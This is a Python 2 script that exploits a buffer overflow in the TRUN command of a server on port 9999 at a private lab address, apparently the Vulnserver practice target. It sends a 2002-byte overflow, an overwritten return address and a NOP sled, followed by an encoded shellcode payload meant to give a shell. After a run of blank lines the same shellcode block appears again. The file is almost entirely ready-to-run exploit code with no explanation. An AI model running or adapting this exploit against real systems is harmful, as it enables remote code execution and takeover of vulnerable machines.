#!/usr/bin/python

import socket
import os
import sys

host = "192.168.248.134"
port = 9999

buffer = "\x41" * 2002
eip = "\xbb\x11\x50\x62" #0x625011bb
nops = "\x90" * 4 *13
buf =  b""
buf += b"\xbf\xfd\x88\xe5\xc2\xda\xce\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x3b\x8c\x07"
buf += b"\x37\x3f\x65\x45\xb8\xbf\x76\x2a\x30\x5a\x47\x6a\x26"
buf += b"\x2f\xf8\x5a\x2c\x7d\xf5\x11\x60\x95\x8e\x54\xad\x9a"
buf += b"\x27\xd2\x8b\x95\xb8\x4f\xef\xb4\x3a\x92\x3c\x16\x02"
buf += b"\x5d\x31\x57\x43\x80\xb8\x05\x1c\xce\x6f\xb9\x29\x9a"
buf += b"\xb3\x32\x61\x0a\xb4\xa7\x32\x2d\x95\x76\x48\x74\x35"
buf += b"\x79\x9d\x0c\x7c\x61\xc2\x29\x36\x1a\x30\xc5\xc9\xca"
buf += b"\x08\x26\x65\x33\xa5\xd5\x77\x74\x02\x06\x02\x8c\x70"
buf += b"\xbb\x15\x4b\x0a\x67\x93\x4f\xac\xec\x03\xab\x4c\x20"
buf += b"\xd5\x38\x42\x8d\x91\x66\x47\x10\x75\x1d\x73\x99\x78"
buf += b"\xf1\xf5\xd9\x5e\xd5\x5e\xb9\xff\x4c\x3b\x6c\xff\x8e"
buf += b"\xe4\xd1\xa5\xc5\x09\x05\xd4\x84\x45\xea\xd5\x36\x96"
buf += b"\x64\x6d\x45\xa4\x2b\xc5\xc1\x84\xa4\xc3\x16\xea\x9e"
buf += b"\xb4\x88\x15\x21\xc5\x81\xd1\x75\x95\xb9\xf0\xf5\x7e"
buf += b"\x39\xfc\x23\xd0\x69\x52\x9c\x91\xd9\x12\x4c\x7a\x33"
buf += b"\x9d\xb3\x9a\x3c\x77\xdc\x31\xc7\x10\x23\x6d\x3f\x60"
buf += b"\xcb\x6c\xbf\x70\x50\xf8\x59\x18\x78\xac\xf2\xb5\xe1"
buf += b"\xf5\x88\x24\xed\x23\xf5\x67\x65\xc0\x0a\x29\x8e\xad"
buf += b"\x18\xde\x7e\xf8\x42\x49\x80\xd6\xea\x15\x13\xbd\xea"
buf += b"\x50\x08\x6a\xbd\x35\xfe\x63\x2b\xa8\x59\xda\x49\x31"
buf += b"\x3f\x25\xc9\xee\xfc\xa8\xd0\x63\xb8\x8e\xc2\xbd\x41"
buf += b"\x8b\xb6\x11\x14\x45\x60\xd4\xce\x27\xda\x8e\xbd\xe1"
buf += b"\x8a\x57\x8e\x31\xcc\x57\xdb\xc7\x30\xe9\xb2\x91\x4f"
buf += b"\xc6\x52\x16\x28\x3a\xc3\xd9\xe3\xfe\xf3\x93\xa9\x57"
buf += b"\x9c\x7d\x38\xea\xc1\x7d\x97\x29\xfc\xfd\x1d\xd2\xfb"
buf += b"\x1e\x54\xd7\x40\x99\x85\xa5\xd9\x4c\xa9\x1a\xd9\x44"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Give me a shell :P..."
s.send("TRUN /.:/ " + buffer + eip + nops + buf)
print s.recv(1024)
s.close()
























buf =  b""
buf += b"\xbf\xfd\x88\xe5\xc2\xda\xce\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x3b\x8c\x07"
buf += b"\x37\x3f\x65\x45\xb8\xbf\x76\x2a\x30\x5a\x47\x6a\x26"
buf += b"\x2f\xf8\x5a\x2c\x7d\xf5\x11\x60\x95\x8e\x54\xad\x9a"
buf += b"\x27\xd2\x8b\x95\xb8\x4f\xef\xb4\x3a\x92\x3c\x16\x02"
buf += b"\x5d\x31\x57\x43\x80\xb8\x05\x1c\xce\x6f\xb9\x29\x9a"
buf += b"\xb3\x32\x61\x0a\xb4\xa7\x32\x2d\x95\x76\x48\x74\x35"
buf += b"\x79\x9d\x0c\x7c\x61\xc2\x29\x36\x1a\x30\xc5\xc9\xca"
buf += b"\x08\x26\x65\x33\xa5\xd5\x77\x74\x02\x06\x02\x8c\x70"
buf += b"\xbb\x15\x4b\x0a\x67\x93\x4f\xac\xec\x03\xab\x4c\x20"
buf += b"\xd5\x38\x42\x8d\x91\x66\x47\x10\x75\x1d\x73\x99\x78"
buf += b"\xf1\xf5\xd9\x5e\xd5\x5e\xb9\xff\x4c\x3b\x6c\xff\x8e"
buf += b"\xe4\xd1\xa5\xc5\x09\x05\xd4\x84\x45\xea\xd5\x36\x96"
buf += b"\x64\x6d\x45\xa4\x2b\xc5\xc1\x84\xa4\xc3\x16\xea\x9e"
buf += b"\xb4\x88\x15\x21\xc5\x81\xd1\x75\x95\xb9\xf0\xf5\x7e"
buf += b"\x39\xfc\x23\xd0\x69\x52\x9c\x91\xd9\x12\x4c\x7a\x33"
buf += b"\x9d\xb3\x9a\x3c\x77\xdc\x31\xc7\x10\x23\x6d\x3f\x60"
buf += b"\xcb\x6c\xbf\x70\x50\xf8\x59\x18\x78\xac\xf2\xb5\xe1"
buf += b"\xf5\x88\x24\xed\x23\xf5\x67\x65\xc0\x0a\x29\x8e\xad"
buf += b"\x18\xde\x7e\xf8\x42\x49\x80\xd6\xea\x15\x13\xbd\xea"
buf += b"\x50\x08\x6a\xbd\x35\xfe\x63\x2b\xa8\x59\xda\x49\x31"
buf += b"\x3f\x25\xc9\xee\xfc\xa8\xd0\x63\xb8\x8e\xc2\xbd\x41"
buf += b"\x8b\xb6\x11\x14\x45\x60\xd4\xce\x27\xda\x8e\xbd\xe1"
buf += b"\x8a\x57\x8e\x31\xcc\x57\xdb\xc7\x30\xe9\xb2\x91\x4f"
buf += b"\xc6\x52\x16\x28\x3a\xc3\xd9\xe3\xfe\xf3\x93\xa9\x57"
buf += b"\x9c\x7d\x38\xea\xc1\x7d\x97\x29\xfc\xfd\x1d\xd2\xfb"
buf += b"\x1e\x54\xd7\x40\x99\x85\xa5\xd9\x4c\xa9\x1a\xd9\x44"
